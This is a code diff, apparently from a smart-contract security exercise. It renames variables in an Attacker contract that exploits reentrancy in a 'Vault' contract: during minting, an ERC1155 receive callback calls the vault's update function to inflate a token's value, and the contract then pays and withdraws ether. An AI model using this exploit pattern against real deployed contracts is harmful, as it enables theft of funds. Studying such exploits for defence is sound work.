@@ -1,5 +1,5 @@
 // SPDX-License-Identifier:  None
-pragma solidity ^0.8.0;
+pragma solidity 0.8.20;
 
 import "./vault.sol";
 
@@ -11,11 +11,11 @@ contract Attacker is IERC1155Receiver  {
     
     Vault vault;
 
-    constructor(address vault_address) payable{
-        vault = Vault(vault_address);
+    constructor(address vaultAddress) payable{
+        vault = Vault(vaultAddress);
     }
 
-    uint256 target_id = 1000; // id start with 0
+    uint256 targetId = 1000; // id start with 0
 
     uint256 counter = 0;
 
@@ -24,18 +24,16 @@ contract Attacker is IERC1155Receiver  {
 
         uint256 id = vault.create(1, 10);
 
-        target_id = id+1;
+        targetId = id+1;
 
-        uint256 ret_id = vault.create(1000, 1);
+        uint256 retId = vault.create(1000, 1);
 
-        require(target_id == ret_id, "reentrancy unsuccess");
+        require(targetId == retId, "reentrancy unsuccess");
 
+        vault.pay_eth{value: 1 ether + 1}(targetId);
 
-        // return vault.getRquire(target_id);
-        vault.pay_eth{value: 1 ether + 1}(target_id);
-
-        vault.withdraw(target_id); 
-        return ret_id;
+        vault.withdraw(targetId); 
+        return retId;
     }
 
     function onERC1155Received(
@@ -46,9 +44,9 @@ contract Attacker is IERC1155Receiver  {
         bytes calldata 
     ) external override returns (bytes4) {
         counter++;
-        if(target_id == id && counter == 2){
-            uint256 updated_id = vault.update(target_id, 1, 1e18);
-            require(target_id == updated_id, "updated value of different token id");
+        if(targetId == id && counter == 2){
+            uint256 updatedId = vault.update(targetId, 1, 1e18);
+            require(targetId == updatedId, "updated value of different token id");
         }
     
 
@@ -68,7 +66,6 @@ contract Attacker is IERC1155Receiver  {
     }
 
     receive() external payable {}
-
 
 
     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
